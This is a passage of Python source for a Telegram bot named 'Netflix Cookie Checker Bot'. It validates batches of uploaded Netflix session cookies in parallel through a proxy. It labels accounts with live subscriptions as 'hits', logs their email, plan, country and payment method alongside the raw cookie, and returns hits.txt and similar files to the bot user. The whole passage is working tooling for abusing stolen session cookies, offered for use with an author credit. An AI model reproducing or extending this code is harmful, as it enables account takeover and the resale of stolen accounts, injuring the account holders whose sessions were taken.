            cookies = load_cookies_from_content(content, fname)

    await status_msg.delete()

    if not cookies:
        await update.message.reply_text("❌ No cookies found in the file\\.", parse_mode=ParseMode.MARKDOWN_V2)
        return

    await run_check_job(update, context, cookies, source=fname)


async def run_check_job(update: Update, context: ContextTypes.DEFAULT_TYPE, cookies: List[str], source: str):
    uid = update.effective_user.id
    total = len(cookies)

    with active_jobs_lock:
        active_jobs[uid] = {
            "cancelled": False,
            "total": total,
            "done": 0,
            "hits": 0,
            "custom": 0,
            "bad": 0,
        }

    await update.message.reply_text(
        f"🔍 *Starting check…*\n"
        f"{DIV}\n"
        f"📂 Source: `{source}`\n"
        f"🍪 Cookies: `{total}`\n"
        f"🧵 Threads: `{THREADS}`\n"
        f"🌐 Proxy: `{DEFAULT_PROXY_STR}`\n"
        f"{DIV}",
        parse_mode=ParseMode.MARKDOWN,
    )

    progress_msg = await update.message.reply_text(
        f"⏳ Progress: `{progress_bar(0, total)}`\n"
        f"✅ Hits: `0`  |  ⚠️ Custom: `0`  |  ❌ Bad: `0`",
        parse_mode=ParseMode.MARKDOWN,
    )

    hits_lines: List[str] = []
    custom_lines: List[str] = []
    bad_lines: List[str] = []
    lock = threading.Lock()

    last_update_time = [time.time()]
    UPDATE_INTERVAL = 3

    def process_one(idx: int, cookie_raw: str) -> dict:
        try:
            nfid, snfid = parse_cookies(cookie_raw)
            if not nfid:
                return {"status": "bad", "msg": "Could not parse NetflixId", "idx": idx}

            res = check_cookie(nfid, snfid)

            if not res["valid"]:
                return {"status": "bad", "msg": res.get("error", "Invalid"), "idx": idx,
                        "nfid": nfid, "snfid": snfid}

            days = calc_days_remaining(res.get("next_billing"))
            if res["has_sub"] and days == "Expired":
                res["has_sub"] = False

            if res["has_sub"]:
                hit_txt = format_hit_result(res, nfid, snfid)
                hit_tg = format_hit_tg(res, nfid, snfid)
                logger.info(
                    "[HIT] Email: %s | Plan: %s | Country: %s | Max Streams: %s | "
                    "Days Remaining: %s | Payment: %s | Profiles: %s | "
                    "Cookie: NetflixId=%s%s",
                    res.get("email", "?"),
                    res.get("plan", "?"),
                    res.get("country", "?"),
                    res.get("max_streams", "?"),
                    days,
                    res.get("payment_method", "?"),
                    ", ".join(res.get("profiles", [])) or "N/A",
                    nfid,
                    f"; SecureNetflixId={snfid}" if snfid else "",
                )
                return {"status": "hit", "hit_txt": hit_txt, "hit_tg": hit_tg,
                        "email": res.get("email", "?"), "plan": res.get("plan", "?"),
                        "country": res.get("country", "?"), "days": days, "idx": idx,
                        "nfid": nfid, "snfid": snfid}
            else:
                email = res.get("email", "Unknown")
                cookie_str = f"NetflixId={nfid}" + (f"; SecureNetflixId={snfid}" if snfid else "")
                custom_line = (
                    f"Email: {email} | No Active Subscription\n"
                    f"Cookie: {cookie_str}\n"
                    f"made by {CREDIT}\n"
                    f"{'─' * 60}"
                )
                return {"status": "custom", "email": email, "custom_line": custom_line,
                        "idx": idx, "nfid": nfid}
        except Exception as e:
            return {"status": "bad", "msg": str(e)[:100], "idx": idx}

    async def do_update_progress():
        with active_jobs_lock:
            job = active_jobs.get(uid, {})
            done = job.get("done", 0)
            h = job.get("hits", 0)
            c = job.get("custom", 0)
            b = job.get("bad", 0)
        try:
            await progress_msg.edit_text(
                f"⏳ Progress: `{progress_bar(done, total)}`  `{done}/{total}`\n"
                f"✅ Hits: `{h}`  |  ⚠️ Custom: `{c}`  |  ❌ Bad: `{b}`",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass

    with ThreadPoolExecutor(max_workers=THREADS) as executor:
        futures = {executor.submit(process_one, i + 1, ck): i for i, ck in enumerate(cookies)}

        for future in as_completed(futures):
            with active_jobs_lock:
                if active_jobs.get(uid, {}).get("cancelled"):
                    executor.shutdown(wait=False, cancel_futures=True)
                    break

            r = future.result()
            status = r.get("status")

            with lock:
                with active_jobs_lock:
                    job = active_jobs.get(uid, {})
                    job["done"] = job.get("done", 0) + 1
                    if status == "hit":
                        job["hits"] = job.get("hits", 0) + 1
                        hits_lines.append(r["hit_txt"])
                    elif status == "custom":
                        job["custom"] = job.get("custom", 0) + 1
                        custom_lines.append(r.get("custom_line", ""))
                    else:
                        job["bad"] = job.get("bad", 0) + 1
                        bad_lines.append(f"BAD | {r.get('msg', 'Unknown error')}")

            if status == "hit":
                try:
                    await context.bot.send_message(
                        chat_id=update.effective_chat.id,
                        text=r["hit_tg"],
                        parse_mode=ParseMode.MARKDOWN,
                    )
                except Exception:
                    pass

            now = time.time()
            if now - last_update_time[0] >= UPDATE_INTERVAL:
                last_update_time[0] = now
                await do_update_progress()

    with active_jobs_lock:
        job = active_jobs.pop(uid, {})
        hits = job.get("hits", 0)
        custom = job.get("custom", 0)
        bad = job.get("bad", 0)
        done = job.get("done", 0)
        cancelled = job.get("cancelled", False)

    status_icon = "⛔" if cancelled else "✅"
    status_text = "Cancelled" if cancelled else "Completed"

    try:
        await progress_msg.edit_text(
            f"{status_icon} *{status_text}*\n"
            f"{DIV}\n"
            f"🍪 Checked: `{done}/{total}`\n"
            f"✅ Hits: `{hits}`\n"
            f"⚠️ Custom \\(No Sub\\): `{custom}`\n"
            f"❌ Bad/Expired: `{bad}`\n"
            f"{DIV}\n"
            f"_{CREDIT}_",
            parse_mode=ParseMode.MARKDOWN_V2,
        )
    except Exception:
        pass

    if hits_lines:
        hits_buf = io.BytesIO("\n".join(hits_lines).encode("utf-8", errors="replace"))
        hits_buf.name = "hits.txt"
        try:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=hits_buf,
                caption=f"✅ *Hits* — {hits} accounts | {CREDIT}",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass

    if custom_lines:
        custom_buf = io.BytesIO("\n".join(custom_lines).encode("utf-8", errors="replace"))
        custom_buf.name = "custom.txt"
        try:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=custom_buf,
                caption=f"⚠️ *Custom* (No Sub) — {custom} accounts | {CREDIT}",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass

    if bad_lines:
        bad_buf = io.BytesIO("\n".join(bad_lines).encode("utf-8", errors="replace"))
        bad_buf.name = "bad.txt"
        try:
            await context.bot.send_document(
                chat_id=update.effective_chat.id,
                document=bad_buf,
                caption=f"❌ *Bad/Expired* — {bad} accounts | {CREDIT}",
                parse_mode=ParseMode.MARKDOWN,
            )
        except Exception:
            pass


def main():
    app = Application.builder().token(BOT_TOKEN).build()

    app.add_handler(CommandHandler("start", cmd_start))
    app.add_handler(CommandHandler("help", cmd_help))
    app.add_handler(CommandHandler("cancel", cmd_cancel))
    app.add_handler(CommandHandler("adduser", cmd_adduser))
    app.add_handler(CommandHandler("removeuser", cmd_removeuser))
    app.add_handler(CommandHandler("users", cmd_users))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_text))

    logger.info("Netflix Cookie Checker Bot started (polling).")
    app.run_polling(drop_pending_updates=True)


if __name__ == "__main__":
    main()
